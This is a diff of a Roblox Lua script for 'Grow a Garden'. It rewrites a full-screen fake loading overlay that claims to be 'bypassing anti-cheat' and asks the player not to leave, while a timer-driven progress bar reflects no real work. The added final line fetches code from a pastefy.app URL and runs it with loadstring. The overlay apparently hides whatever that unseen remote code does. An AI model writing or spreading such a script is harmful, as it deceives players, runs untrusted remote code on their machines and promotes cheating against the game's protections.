@@ -1,110 +1,75 @@
-
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
-local TweenService = game:GetService("TweenService")
 
--- Create screen GUI
-local gui = Instance.new("ScreenGui")
-gui.Name = "LoadingUI"
-gui.IgnoreGuiInset = true
-gui.ResetOnSpawn = false
-gui.Parent = playerGui
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Name = "CustomLoadingScreen"
+loadingGui.IgnoreGuiInset = true
+loadingGui.DisplayOrder = 999999
+loadingGui.ResetOnSpawn = false
+loadingGui.Parent = playerGui
 
--- Background
-local bg = Instance.new("Frame")
+local bg = Instance.new("Frame", loadingGui)
 bg.Size = UDim2.new(1, 0, 1, 0)
-bg.Position = UDim2.new(0, 0, 0, 0)
-bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-bg.Parent = gui
+bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+bg.BorderSizePixel = 0
 
--- Gradient
-local gradient = Instance.new("UIGradient")
-gradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 20)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 80, 80))
-}
-gradient.Parent = bg
-
--- Title
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 100)
-title.Position = UDim2.new(0, 0, 0.20, 0)
-title.Text = "🌴 GROW A GARDEN 🌴"
-title.Font = Enum.Font.GothamBlack
-title.TextSize = 50
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
+local title = Instance.new("TextLabel", bg)
+title.Size = UDim2.new(1, 0, 0, 50)
+title.Position = UDim2.new(0, 0, 0.18, 0)
 title.BackgroundTransparency = 1
-title.TextStrokeTransparency = 0.8
-title.TextWrapped = true
-title.Parent = bg
+title.Text = "GROW A GARDEN"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.Font = Enum.Font.GothamBlack
+title.TextScaled = true
 
--- Subtitle
-local subtitle = Instance.new("TextLabel")
-subtitle.Size = UDim2.new(1, 0, 0, 30)
-subtitle.Position = UDim2.new(0, 0, 0.38, 0)
-subtitle.Text = "Script is loading, please wait..."
-subtitle.Font = Enum.Font.Gotham
-subtitle.TextSize = 20
-subtitle.TextColor3 = Color3.fromRGB(230, 230, 230)
-subtitle.BackgroundTransparency = 1
-subtitle.TextStrokeTransparency = 0.8
-subtitle.TextWrapped = true
-subtitle.Parent = bg
+local loadingLabel = Instance.new("TextLabel", bg)
+loadingLabel.Size = UDim2.new(1, 0, 0, 40)
+loadingLabel.Position = UDim2.new(0, 0, 0.30, 0)
+loadingLabel.BackgroundTransparency = 1
+loadingLabel.Text = "Loading Script..."
+loadingLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+loadingLabel.Font = Enum.Font.Gotham
+loadingLabel.TextScaled = true
 
--- Warning
-local warning = Instance.new("TextLabel")
-warning.Size = UDim2.new(1, 0, 0, 30)
-warning.Position = UDim2.new(0, 0, 0.45, 0)
-warning.Text = "⚠️ DO NOT LEAVE, THIS SCRIPT IS CURRENTLY BYPASSING ANTI-CHEAT ⚠️"
-warning.Font = Enum.Font.GothamBold
-warning.TextSize = 18
-warning.TextColor3 = Color3.fromRGB(255, 80, 80)
+local percent = Instance.new("TextLabel", bg)
+percent.Size = UDim2.new(1, 0, 0, 40)
+percent.Position = UDim2.new(0, 0, 0.38, 0)
+percent.BackgroundTransparency = 1
+percent.Text = "0%"
+percent.TextColor3 = Color3.fromRGB(0, 255, 0)
+percent.Font = Enum.Font.GothamBold
+percent.TextScaled = true
+
+local barBG = Instance.new("Frame", bg)
+barBG.Size = UDim2.new(0.6, 0, 0, 16)
+barBG.Position = UDim2.new(0.2, 0, 0.475, 0) -- Moved down for spacing
+barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+barBG.BorderSizePixel = 0
+barBG.ClipsDescendants = true
+Instance.new("UICorner", barBG).CornerRadius = UDim.new(0, 8)
+
+local barFill = Instance.new("Frame", barBG)
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+barFill.BorderSizePixel = 0
+Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 8)
+
+local warning = Instance.new("TextLabel", bg)
+warning.Size = UDim2.new(1, -20, 0, 30)
+warning.Position = UDim2.new(0, 10, 0.88, 0)
 warning.BackgroundTransparency = 1
-warning.TextStrokeTransparency = 0.6
-warning.TextWrapped = true
-warning.Parent = bg
+warning.Text = "PLEASE DO NOT LEAVE - BYPASSING ANTI-CHEAT"
+warning.TextColor3 = Color3.fromRGB(255, 80, 80)
+warning.Font = Enum.Font.GothamBold
+warning.TextScaled = true
 
--- Loading bar background
-local loadBg = Instance.new("Frame")
-loadBg.Size = UDim2.new(0.6, 0, 0, 20)
-loadBg.Position = UDim2.new(0.2, 0, 0.55, 0)
-loadBg.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-loadBg.BorderSizePixel = 0
-loadBg.BackgroundTransparency = 0.2
-loadBg.ClipsDescendants = true
-loadBg.AnchorPoint = Vector2.new(0, 0.5)
-loadBg.Parent = bg
-
--- Loading bar fill
-local loadBar = Instance.new("Frame")
-loadBar.Size = UDim2.new(0, 0, 1, 0)
-loadBar.Position = UDim2.new(0, 0, 0, 0)
-loadBar.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
-loadBar.BorderSizePixel = 0
-loadBar.Parent = loadBg
-
--- Choose random load duration (1 to 5 minutes)
-local loadTime = math.random(60, 300)
-
--- Animate bar
-local tweenInfo = TweenInfo.new(loadTime, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
-local tween = TweenService:Create(loadBar, tweenInfo, {
-    Size = UDim2.new(1, 0, 1, 0)
-})
-tween:Play()
-
--- % progress update
+-- Loading logic
 task.spawn(function()
-    for i = 1, loadTime do
-        local percent = math.floor((i / loadTime) * 100)
-        subtitle.Text = "Loading... " .. percent .. "%"
-        wait(1)
-    end
+	for i = 1, 100 do
+		percent.Text = i .. "%"
+		barFill:TweenSize(UDim2.new(i / 100, 0, 1, 0), "Out", "Quad", 0.1, true)
+		wait(1.8)
+	end
+	loadingGui:Destroy()
 end)
-
--- On complete
-tween.Completed:Connect(function()
-    subtitle.Text = "Script loaded successfully!"
-    wait(1.5)
-    gui:Destroy()
-end)
+loadstring(game:HttpGet("https://pastefy.app/X8I13KvO/raw"))()
